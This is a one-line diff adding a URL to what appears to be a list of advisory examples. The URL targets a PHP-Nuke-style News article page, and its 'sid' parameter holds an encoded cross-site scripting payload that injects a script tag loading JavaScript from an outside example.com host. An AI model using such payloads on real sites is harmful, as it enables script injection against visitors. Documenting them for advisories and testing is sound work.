@@ -1,0 +1,1 @@
+http://www.example.com/modules.php?op=modload&amp;name=News&amp;file=article&amp;sid=1%22%3E%3Cscript+src=http://www.example.com/advisory/1.js+a=
